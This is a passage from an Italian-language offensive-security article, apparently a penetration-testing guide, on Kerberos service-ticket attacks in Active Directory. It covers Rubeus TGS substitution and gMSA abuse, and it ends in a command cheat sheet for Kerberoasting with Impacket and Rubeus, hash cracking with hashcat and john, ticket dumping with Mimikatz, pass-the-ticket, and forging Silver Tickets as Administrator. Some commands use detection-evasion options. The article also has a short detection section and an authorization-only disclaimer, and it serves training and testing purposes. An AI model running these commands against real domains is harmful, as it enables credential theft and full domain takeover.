  /altservice:host/fileserver.corp.local \
  /ptt
```

Da HTTP a LDAP:

```powershell
.\Rubeus.exe tgssub \
  /ticket:http_ticket.kirbi \
  /altservice:ldap/dc01.corp.local \
  /outfile:ldap_ticket.kirbi
```

Salvare senza iniettare:

```powershell
.\Rubeus.exe tgssub \
  /ticket:original.kirbi \
  /altservice:cifs/server.corp.local \
  /outfile:modified.kirbi
```

La sostituzione non funziona arbitrariamente tra servizi gestiti da account differenti. Il servizio di destinazione deve poter decifrare il ticket con la stessa chiave.

È particolarmente rilevante negli abusi di:

* constrained delegation;
* resource-based constrained delegation;
* S4U2self;
* S4U2proxy;
* computer account con numerosi SPN associati.

***

## Account gMSA: Cambiare Vettore

Verifica gli account gMSA:

```powershell
Get-ADServiceAccount -Filter * \
  -Properties ServicePrincipalName,
              PrincipalsAllowedToRetrieveManagedPassword,
              msDS-ManagedPasswordInterval |
  Select-Object Name,
                ServicePrincipalName,
                PrincipalsAllowedToRetrieveManagedPassword,
                msDS-ManagedPasswordInterval
```

Se un account è gMSA:

* non perdere tempo con cracking tradizionale;
* controlla chi può leggere la managed password;
* analizza ACL e gruppi autorizzati;
* cerca host sui quali il gMSA viene utilizzato;
* verifica delegation e privilegi;
* analizza i path con BloodHound;
* controlla se hai compromesso un computer autorizzato a recuperarne il segreto.

Un gMSA ben configurato elimina quasi completamente il rischio legato al Kerberoasting della password, ma non elimina gli abusi derivanti da autorizzazioni errate.

***

## Detection Essenziale

Il focus dell’articolo è offensivo, ma conoscere la telemetria aiuta a capire quali azioni vengono prodotte durante il test.

### Event ID 4769

L’evento `4769` viene generato sul Domain Controller quando il KDC riceve una richiesta TGS.

Campi utili:

* account richiedente;
* service name;
* client address;
* ticket encryption type;
* ticket options;
* failure code;
* supported encryption types;
* chiavi disponibili per il servizio.

Indicatori frequenti:

* molti SPN richiesti dallo stesso account;
* account che non richiede normalmente ticket;
* numerosi TGS in pochi secondi;
* RC4 `0x17` in un dominio AES-first;
* service account ad alto valore richiesti da workstation insolite;
* richieste fuori dalla baseline dell’utente.

### Silver Ticket

Un Silver Ticket presentato direttamente al servizio può produrre:

* evento `4624` sull’host target;
* accesso applicativo;
* utilizzo del servizio;
* assenza di un corrispondente evento `4769` sul Domain Controller.

La correlazione importante non è l’assenza dell’evento `4627`, ma:

```text
accesso Kerberos al servizio
senza una precedente richiesta TGS coerente sul KDC
```

Altri segnali:

* username inesistente;
* SID o gruppi anomali;
* servizio usato da una workstation inattesa;
* account utilizzato fuori dagli host abituali;
* ticket con dati inconsistenti;
* processi che accedono a LSASS;
* uso di `.kirbi` o `.ccache` da processi insoliti.

***

## Troubleshooting

### `KDC_ERR_S_PRINCIPAL_UNKNOWN`

Il KDC non trova lo SPN.

Controlla:

```cmd
setspn -Q MSSQLSvc/sql01.corp.local:1433
```

Possibili cause:

* SPN inesistente;
* hostname sbagliato;
* porta mancante;
* alias DNS non registrato;
* SPN registrato con formato differente.

### `KDC_ERR_PRINCIPAL_NOT_UNIQUE`

Lo SPN è duplicato.

```cmd
setspn -X
```

Ricerca puntuale:

```cmd
setspn -Q HTTP/web01.corp.local
```

### `KRB_AP_ERR_MODIFIED`

Il servizio non riesce a decifrare il ticket.

Cause comuni:

* SPN registrato sull’account sbagliato;
* password del service account modificata ma servizio non aggiornato;
* ticket forgiato con chiave errata;
* hostname o alias non coerente;
* più servizi configurati con account differenti;
* vecchio ticket ancora in cache.

Pulizia cache:

```cmd
klist purge
```

### Clock skew

Kerberos dipende fortemente dalla sincronizzazione temporale.

Linux:

```bash
sudo ntpdate dc01.corp.local
```

Oppure:

```bash
sudo timedatectl set-ntp false
sudo ntpdate 10.10.10.5
```

Windows:

```cmd
w32tm /query /status
w32tm /resync
```

### Usare IP invece del nome

Questo comando può provocare fallback NTLM:

```cmd
dir \\10.10.10.20\C$
```

Preferisci:

```cmd
dir \\fileserver.corp.local\C$
```

Da Linux, configura correttamente DNS o `/etc/hosts`:

```text
10.10.10.5   dc01.corp.local dc01
10.10.10.20  fileserver.corp.local fileserver
10.10.10.30  sql01.corp.local sql01
```

### Cache Kerberos errata

```bash
echo "$KRB5CCNAME"
klist
```

Impostazione corretta:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
```

### Ticket scaduto

```bash
klist
```

Controlla:

* `Valid starting`;
* `Expires`;
* `renew until`;
* principal;
* service principal;
* encryption type.

### RC4 non supportato

Nei domini moderni puoi ricevere errori legati alla mancata intersezione tra encryption type.

Prova:

* AES128;
* AES256;
* `-no-rc4` con Impacket;
* `/aes` con Rubeus;
* verifica `msDS-SupportedEncryptionTypes`;
* verifica che la password dell’account sia stata cambiata dopo l’introduzione del supporto AES;
* controlla Event ID 27 sul KDC.

***

## Cheat Sheet

```text
=== ENUMERAZIONE SPN ===

Linux:
impacket-GetUserSPNs 'corp.local/user:Password123!' -dc-ip DC_IP

Windows:
setspn -T corp.local -Q */*
Get-DomainUser -SPN
.\Rubeus.exe kerberoast /stats


=== KERBEROASTING CON IMPACKET ===

Tutti:
impacket-GetUserSPNs 'corp.local/user:Password123!' \
  -dc-ip DC_IP -request -outputfile hashes.txt

Utente specifico:
impacket-GetUserSPNs 'corp.local/user:Password123!' \
  -dc-ip DC_IP -request-user svc_sql -outputfile svc_sql.txt

Pass-the-Hash:
impacket-GetUserSPNs corp.local/user \
  -hashes ':NTHASH' -dc-ip DC_IP \
  -request -outputfile hashes.txt

Ticket cache:
export KRB5CCNAME=user.ccache
impacket-GetUserSPNs corp.local/user \
  -k -no-pass -dc-ip DC_IP \
  -request -outputfile hashes.txt


=== KERBEROASTING CON RUBEUS ===

Tutti:
.\Rubeus.exe kerberoast /outfile:hashes.txt

Account specifico:
.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.txt

Statistiche:
.\Rubeus.exe kerberoast /stats

Account privilegiati:
.\Rubeus.exe kerberoast \
  /ldapfilter:"admincount=1" \
  /outfile:admin_hashes.txt

Password vecchie:
.\Rubeus.exe kerberoast \
  /pwdsetbefore:01-01-2023 \
  /outfile:old_hashes.txt

Richieste controllate:
.\Rubeus.exe kerberoast \
  /delay:5000 /jitter:30 \
  /outfile:hashes.txt

RC4 su account non AES:
.\Rubeus.exe kerberoast \
  /rc4opsec \
  /outfile:rc4_hashes.txt

AES:
.\Rubeus.exe kerberoast \
  /aes \
  /outfile:aes_hashes.txt


=== CRACK ===

RC4:
hashcat -m 13100 hashes.txt rockyou.txt

AES128:
hashcat -m 19600 hashes.txt rockyou.txt

AES256:
hashcat -m 19700 hashes.txt rockyou.txt

John:
john --format=krb5tgs \
  --wordlist=rockyou.txt \
  hashes.txt


=== DUMP SERVICE TICKET ===

Rubeus:
.\Rubeus.exe dump /service:MSSQLSvc /nowrap

Mimikatz:
sekurlsa::tickets /export

Conversione:
impacket-ticketConverter ticket.kirbi ticket.ccache


=== PASS-THE-TICKET ===

Windows:
.\Rubeus.exe ptt /ticket:service_ticket.kirbi

Linux:
export KRB5CCNAME=service_ticket.ccache
impacket-smbclient -k -no-pass \
  corp.local/User@server.corp.local


=== SILVER TICKET ===

Impacket RC4:
impacket-ticketer \
  -nthash SERVICE_HASH \
  -domain-sid DOMAIN_SID \
  -domain corp.local \
  -spn cifs/server.corp.local \
  Administrator

Impacket AES:
impacket-ticketer \
  -aesKey AES256_KEY \
  -domain-sid DOMAIN_SID \
  -domain corp.local \
  -spn MSSQLSvc/sql01.corp.local:1433 \
  Administrator

Uso:
export KRB5CCNAME=Administrator.ccache


=== TGS SUBSTITUTION ===

.\Rubeus.exe tgssub \
  /ticket:original.kirbi \
  /altservice:cifs/server.corp.local \
  /ptt


=== ERRORI COMUNI ===

KDC_ERR_S_PRINCIPAL_UNKNOWN:
SPN inesistente o scritto male

KDC_ERR_PRINCIPAL_NOT_UNIQUE:
SPN duplicato

KRB_AP_ERR_MODIFIED:
chiave errata o SPN registrato sull'account sbagliato

Clock skew:
sincronizza l'orario con il DC

Accesso tramite IP:
usa FQDN coerente con lo SPN

RC4 rifiutato:
usa AES e verifica msDS-SupportedEncryptionTypes
```

***

## Articoli Correlati

* [Kerberos: architettura e flusso](https://hackita.it/articoli/kerberos/)
* [TGT Kerberos: Ticket Granting Ticket](https://hackita.it/articoli/tgt-kerberos/)
* [Kerberoasting: guida completa](https://hackita.it/articoli/kerberoasting/)
* [Silver Ticket Attack](https://hackita.it/articoli/silver-ticket/)
* [Golden Ticket Attack](https://hackita.it/articoli/golden-ticket/)
* [GetUserSPNs.py con Impacket](https://hackita.it/articoli/getuserspns/)
* [Rubeus: guida completa](https://hackita.it/articoli/rubeus/)
* [BloodHound: trovare i path di attacco](https://hackita.it/articoli/bloodhound/)
* [Credential Dumping su Windows](https://hackita.it/articoli/credential-dumping/)
* [Pass-the-Ticket in Active Directory](https://hackita.it/articoli/pass-the-ticket/)

***

## Riferimenti Tecnici

* [MITRE ATT\&CK T1558.003 — Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
* [MITRE ATT\&CK T1558.002 — Silver Ticket](https://attack.mitre.org/techniques/T1558/002/)
* [Microsoft — Event ID 4769](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
* [Microsoft — Service Principal Names](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names)
* [Microsoft — RC4 Kerberos Hardening](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
* [Rubeus — Repository Ufficiale](https://github.com/GhostPack/Rubeus)
* [Impacket — Repository Ufficiale](https://github.com/fortra/impacket)

> Tutti i comandi e le tecniche illustrate devono essere utilizzati esclusivamente in laboratori, infrastrutture proprie o ambienti per i quali si dispone di un’autorizzazione esplicita.
